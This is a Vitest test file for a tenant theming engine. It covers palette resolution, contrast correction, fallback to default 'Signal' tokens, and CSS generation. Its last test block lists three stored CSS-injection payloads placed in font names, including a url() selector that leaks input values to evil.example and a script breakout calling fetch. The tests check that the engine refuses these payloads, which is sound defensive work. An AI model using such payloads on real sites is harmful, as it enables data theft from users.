import { describe, expect, test, vi } from "vitest";
import {
  SIGNAL_COLORS,
  SIGNAL_DEFAULT_TOKENS,
  toCssVariables,
  type TenantTheme,
} from "@/lib/skills/brand-kit";
import { DEMO_TENANTS } from "./demo-themes";
import {
  DERIVED_VARIABLE_NAMES,
  deriveOnColorForegrounds,
  resolveTenantTheme,
  tenantThemeCss,
} from "./engine";

const coastal = DEMO_TENANTS.find((t) => t.id === "coastal-realty")!.theme!;
const verde = DEMO_TENANTS.find((t) => t.id === "verde-botanica")!.theme!;
const midgrey = DEMO_TENANTS.find((t) => t.id === "midgrey-holdings")!.theme!;

/** The exact variable set a resolution must emit: pipeline + derived. */
function expectedKeys(): string[] {
  return [
    ...Object.keys(toCssVariables(SIGNAL_DEFAULT_TOKENS)),
    ...DERIVED_VARIABLE_NAMES,
  ].sort();
}

describe("resolveTenantTheme — the re-skin proof (doc 06 §3)", () => {
  test("two different tenant themes produce complete, distinct variable sets through the same code path", () => {
    const a = resolveTenantTheme(coastal);
    const b = resolveTenantTheme(verde);

    expect(a.source).toBe("tenant");
    expect(b.source).toBe("tenant");

    // Complete: both emit exactly the same variable NAMES (the full token
    // contract — nothing missing, nothing extra), so swapping themes can
    // never leave a component half-themed.
    expect(Object.keys(a.variables).sort()).toEqual(expectedKeys());
    expect(Object.keys(b.variables).sort()).toEqual(expectedKeys());

    // Distinct: the brand-expressive values differ.
    expect(a.variables["--surface"]).not.toBe(b.variables["--surface"]);
    expect(a.variables["--accent"]).not.toBe(b.variables["--accent"]);
    expect(a.variables["--font-display"]).not.toBe(b.variables["--font-display"]);
  });

  test("every emitted variable comes from the token pipeline (or the documented derived set)", () => {
    for (const theme of [coastal, verde]) {
      const resolution = resolveTenantTheme(theme);
      const allowed = new Set(expectedKeys());
      for (const name of Object.keys(resolution.variables)) {
        expect(allowed.has(name), `${name} is not a pipeline/derived variable`).toBe(true);
      }
    }
  });

  test("a pre-validated theme (authored via buildBrandKit) passes with no corrections", () => {
    const resolution = resolveTenantTheme(coastal);
    expect(resolution.report?.pass).toBe(true);
    expect(resolution.report?.adjustments).toEqual([]);
    expect(resolution.fallbackReason).toBeNull();
  });

  test("a near-failing hand-authored theme is auto-corrected, applied, and every fix is reported", () => {
    const resolution = resolveTenantTheme(verde);
    expect(resolution.source).toBe("tenant");
    expect(resolution.report?.pass).toBe(true);
    expect(resolution.report!.adjustments.length).toBeGreaterThan(0);

    // The emitted variables carry the CORRECTED values, not the raw input.
    for (const adjustment of resolution.report!.adjustments) {
      expect(resolution.variables[`--${adjustment.token}`]).toBe(adjustment.to);
      expect(resolution.variables[`--${adjustment.token}`]).not.toBe(
        verde.colors[adjustment.token as keyof typeof verde.colors]
      );
      expect(adjustment.reason).toMatch(/required|distinguishability/);
    }
  });

  test("an unsolvable palette is REFUSED: Signal fallback + logged reason (doc 06 gate)", () => {
    const onFallback = vi.fn();
    const resolution = resolveTenantTheme(midgrey, { onFallback });

    expect(resolution.source).toBe("signal-fallback");
    expect(resolution.fallbackReason).toMatch(/cannot meet the contrast requirements/);
    expect(onFallback).toHaveBeenCalledTimes(1);
    expect(onFallback.mock.calls[0][0]).toBe(resolution.fallbackReason);

    // The failing report is preserved so the UI can explain the refusal.
    expect(resolution.report?.pass).toBe(false);

    // The applied variables are the Signal defaults from the same pipeline.
    const signalVars = toCssVariables(SIGNAL_DEFAULT_TOKENS);
    for (const [name, value] of Object.entries(signalVars)) {
      expect(resolution.variables[name]).toBe(value);
    }
    expect(Object.keys(resolution.variables).sort()).toEqual(expectedKeys());
  });

  test("a malformed theme (unparseable hex) is refused the same way", () => {
    const onFallback = vi.fn();
    const broken: TenantTheme = {
      ...coastal,
      colors: { ...coastal.colors, accent: "not-a-color" },
    };
    const resolution = resolveTenantTheme(broken, { onFallback });
    expect(resolution.source).toBe("signal-fallback");
    expect(resolution.report).toBeNull();
    expect(resolution.fallbackReason).toMatch(/malformed/);
    expect(onFallback).toHaveBeenCalledTimes(1);
  });

  test("refusal is never silent: default fallback logger warns", () => {
    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
    try {
      resolveTenantTheme(midgrey);
      expect(warn).toHaveBeenCalledTimes(1);
      expect(String(warn.mock.calls[0][0])).toContain("tenant theme refused");
    } finally {
      warn.mockRestore();
    }
  });
});

describe("deriveOnColorForegrounds", () => {
  test("picks the higher-contrast side per fill (dark Signal → surface everywhere)", () => {
    expect(deriveOnColorForegrounds(SIGNAL_COLORS)).toEqual({
      accent: "surface",
      accentSecondary: "surface",
      accentWarm: "surface",
      positive: "surface",
      negative: "surface",
    });
  });

  test("flips to ink when the fill contrasts better with ink (light chrome)", () => {
    const choices = deriveOnColorForegrounds({
      surface: "#f4f6f9",
      surfaceRaised: "#e7ebf2",
      ink: "#1b202a",
      muted: "#5c6677",
      accent: "#b4791d",
      accentSecondary: "#2392ad",
      accentWarm: "#b9791d",
      positive: "#309772",
      negative: "#eb5241",
    });
    expect(choices).toEqual({
      accent: "ink",
      accentSecondary: "ink",
      accentWarm: "ink",
      positive: "ink",
      negative: "ink",
    });
  });
});

describe("tenantThemeCss", () => {
  test("emits a :root[data-tenant-theme] block containing the full variable set", () => {
    const resolution = resolveTenantTheme(coastal);
    const css = tenantThemeCss(resolution, "coastal-realty");
    expect(css.startsWith(':root[data-tenant-theme="coastal-realty"] {')).toBe(true);
    for (const [name, value] of Object.entries(resolution.variables)) {
      expect(css).toContain(`${name}: ${value};`);
    }
  });

  test("strips quote characters from the tenant id (selector safety)", () => {
    const resolution = resolveTenantTheme(coastal);
    const css = tenantThemeCss(resolution, 'evil"]{}x');
    expect(css.startsWith(':root[data-tenant-theme="evil]{}x"]')).toBe(true);
  });
});

describe("hostile font stacks are refused at the engine (B1: stored CSS injection)", () => {
  // The three payloads confirmed exploitable in the B1 code-review finding.
  const HOSTILE_FONT_STACKS = [
    "Inter; } html{display:none} :root{ ",
    'x; } input[value^="a"]{background:url(https://evil.example/a)} :root{',
    'x</style><script>fetch("https://evil.example")</script>',
  ] as const;

  function hostileTheme(face: "display" | "body" | "mono", payload: string): TenantTheme {
    // Valid palette (coastal) + one hostile font — the font gate must be the
    // sole reason for refusal.
    return { ...coastal, font: { ...coastal.font, [face]: payload } };
  }

  test.each(HOSTILE_FONT_STACKS)(
    "payload %# → REFUSED: signal-fallback + logged reason, never rendered",
    (payload) => {
      const faces = ["display", "body", "mono"] as const;
      for (const face of faces) {
        const onFallback = vi.fn();
        const resolution = resolveTenantTheme(hostileTheme(face, payload), { onFallback });

        expect(resolution.source).toBe("signal-fallback");
        expect(resolution.fallbackReason).toMatch(/malformed/);
        expect(resolution.fallbackReason).toMatch(
          new RegExp(`typography\\.${face} is not a valid CSS font-family list`)
        );
        expect(onFallback).toHaveBeenCalledTimes(1);

        // The applied variables are the Signal set — no attacker byte survives.
        const signalVars = toCssVariables(SIGNAL_DEFAULT_TOKENS);
        expect(resolution.variables[`--font-${face}`]).toBe(signalVars[`--font-${face}`]);
        for (const value of Object.values(resolution.variables)) {
          expect(value).not.toContain(payload);
        }
      }
    }
  );

  test("the emitted tenantThemeCss for a hostile tenant contains no rule-breaking characters", () => {
    for (const payload of HOSTILE_FONT_STACKS) {
      const css = tenantThemeCss(
        resolveTenantTheme(hostileTheme("display", payload), { onFallback: vi.fn() }),
        "hostile-tenant"
      );
      // Exactly one `}` — the block's own closer, as the final character.
      expect(css.indexOf("}")).toBe(css.length - 1);
      // Exactly one `{` — the block's own opener.
      expect(css.indexOf("{")).toBe(css.lastIndexOf("{"));
      // No element/HTML breakout, no CSS exfiltration primitives.
      expect(css).not.toContain("<");
      expect(css).not.toContain("url(");
      expect(css).not.toContain("display:none");
      expect(css).not.toContain("evil.example");
    }
  });

  test("a legitimate multi-family stack flows through the engine byte-for-byte unchanged", () => {
    const stack = '"Space Grotesk", "Helvetica Neue", Arial, sans-serif';
    const theme: TenantTheme = { ...coastal, font: { ...coastal.font, display: stack } };
    const resolution = resolveTenantTheme(theme);

    expect(resolution.source).toBe("tenant");
    expect(resolution.variables["--font-display"]).toBe(stack);
    expect(tenantThemeCss(resolution, "coastal-realty")).toContain(
      `--font-display: ${stack};`
    );
  });
});
